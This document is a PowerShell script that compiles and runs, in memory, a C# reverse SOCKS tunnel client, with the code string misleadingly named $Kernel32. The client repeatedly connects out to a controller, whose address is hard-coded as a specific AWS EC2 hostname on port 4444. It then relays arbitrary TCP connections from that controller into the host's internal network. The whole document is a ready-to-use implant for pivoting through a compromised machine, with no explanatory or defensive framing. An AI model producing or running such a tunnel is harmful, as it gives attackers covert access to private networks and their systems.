$Kernel32 = @"
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

class ReverseSocksClient
{
    public static async Task Main(string[] args)
    {
        string serverIp = args.Length > 0 ? args[0] : "1.2.3.4";
        int serverPort = args.Length > 1 ? int.Parse(args[1]) : 4444;

        while (true)
        {
            TcpClient control = null;
            try
            {
                control = new TcpClient();
                await control.ConnectAsync(serverIp, serverPort);
                Console.WriteLine("[*] Connected to controller.");
                await ControlLoop(control.GetStream());
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Error: " + e.Message);
                await Task.Delay(3000);
            }
            finally
            {
                if (control != null)
                    control.Close();
            }
        }
    }

    static async Task ControlLoop(NetworkStream control)
    {
        byte[] buffer = new byte[1024];

        while (true)
        {
            int header = control.ReadByte();
            if (header != 0x01)
                break;

            int ipLen = control.ReadByte();
            control.Read(buffer, 0, ipLen);
            string targetHost = ipLen == 4
                ? new IPAddress(new byte[] { buffer[0], buffer[1], buffer[2], buffer[3] }).ToString()
                : Encoding.ASCII.GetString(buffer, 0, ipLen);

            control.Read(buffer, 0, 2);
            int targetPort = (buffer[0] << 8) | buffer[1];

            Console.WriteLine("[*] CONNECT to " + targetHost + ":" + targetPort);

            TcpClient internalClient = new TcpClient();
            try
            {
                await internalClient.ConnectAsync(targetHost, targetPort);
                control.WriteByte(0x02); // success

                NetworkStream targetStream = internalClient.GetStream();
                Task.Run(() => Pipe(targetStream, control));
                await Pipe(control, targetStream);
            }
            catch
            {
                Console.WriteLine("[-] Failed to connect internally.");
                control.WriteByte(0x03); // fail
                internalClient.Close();
            }
        }
    }

    static async Task Pipe(NetworkStream src, NetworkStream dst)
    {
        byte[] buf = new byte[8192];
        try
        {
            while (true)
            {
                int n = await src.ReadAsync(buf, 0, buf.Length);
                if (n <= 0) break;
                await dst.WriteAsync(buf, 0, n);
            }
        }
        catch { }
        finally
        {
            try { src.Close(); } catch { }
            try { dst.Close(); } catch { }
        }
    }
}
"@
Add-type $Kernel32
[ReverseSocksClient]::Main("ec2-56-124-47-78.sa-east-1.compute.amazonaws.com 4444".split()).Wait()
